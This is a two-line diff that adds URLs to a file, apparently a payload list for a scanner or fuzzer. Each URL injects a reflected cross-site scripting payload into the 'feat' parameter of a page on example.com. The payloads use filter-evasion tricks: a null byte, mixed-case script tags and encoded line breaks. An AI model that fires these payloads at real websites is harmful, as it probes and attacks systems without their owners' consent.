@@ -1,0 +1,2 @@
+http://www.example.com/links_style1/?id_category=1&amp;feat=1%00&quot;&#039;&gt;&lt;ScRiPt%20%0a%0d&gt;alert(310243950025)%3B&lt;/ScRiPt&gt;
+http://www.example.com/links_style1/index.php?id_category=0&amp;feat=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(325194346916)%3B&lt;/ScRiPt&gt;
